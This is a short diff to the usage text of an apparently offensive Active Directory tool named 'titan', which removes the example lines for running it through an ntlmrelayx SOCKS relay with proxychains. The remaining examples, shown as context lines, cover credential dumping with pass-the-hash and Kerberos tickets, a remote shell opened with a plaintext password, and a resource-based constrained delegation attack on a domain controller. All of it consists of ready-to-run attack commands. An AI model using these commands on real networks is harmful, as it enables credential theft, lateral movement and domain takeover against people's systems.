@@ -19,10 +19,6 @@ Quick examples:
   titan dump -u Administrator -d ECORP -hashes :NThash -t 192.168.15.40
   KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t 192.168.15.40
 
-  # ntlmrelayx --socks relay — credits are patched automatically, no extra steps:
-  proxychains titan dump DOMAIN/user@<ip> --no-pass
-  proxychains titan shell --scm DOMAIN/user@<ip> --no-pass   # port 445 only
-
   titan shell ECORP/Administrator:'P@ss'@192.168.15.42
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
 """
